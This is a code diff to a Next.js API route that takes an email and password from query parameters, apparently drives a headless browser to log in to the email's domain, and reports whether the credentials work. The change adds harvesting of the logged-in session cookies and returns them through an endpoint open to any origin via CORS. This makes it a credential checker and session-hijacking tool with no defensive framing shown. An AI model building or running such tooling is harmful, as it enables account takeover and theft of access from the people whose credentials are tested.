@@ -61,6 +61,7 @@ async function checkAccountAccess(email, password) {
   let browser = null;
   let emailExists = false;
   let accountAccess = false;
+  let cookies = null;
 
   try {
     const domain = email.split('@')[1];
@@ -154,6 +155,12 @@ async function checkAccountAccess(email, password) {
     }, loginFailed);
 
     accountAccess = loginErrorElements === 0;
+
+    // Fetch cookies if login is successful
+    if (accountAccess) {
+      const browserCookies = await page.cookies();
+      cookies = JSON.stringify(browserCookies);
+    }
   } catch (err) {
     console.log(`Error checking account access: ${err.message}`);
   } finally {
@@ -162,7 +169,7 @@ async function checkAccountAccess(email, password) {
     }
   }
 
-  return { emailExists, accountAccess };
+  return { emailExists, accountAccess, cookies };
 }
 
 export async function GET(request) {
@@ -174,9 +181,9 @@ export async function GET(request) {
     return NextResponse.json({ error: "Missing email or password parameter" }, { status: 400 });
   }
 
-  const { emailExists, accountAccess } = await checkAccountAccess(email, password);
+  const { emailExists, accountAccess, cookies } = await checkAccountAccess(email, password);
 
-  const response = NextResponse.json({ emailExists, accountAccess }, { status: 200 });
+  const response = NextResponse.json({ emailExists, accountAccess, cookies }, { status: 200 });
   
   // Add CORS headers
   response.headers.set("Access-Control-Allow-Origin", "*");
@@ -195,5 +202,3 @@ export async function OPTIONS() {
   
   return response;
 }
-
-// return browser cookie also
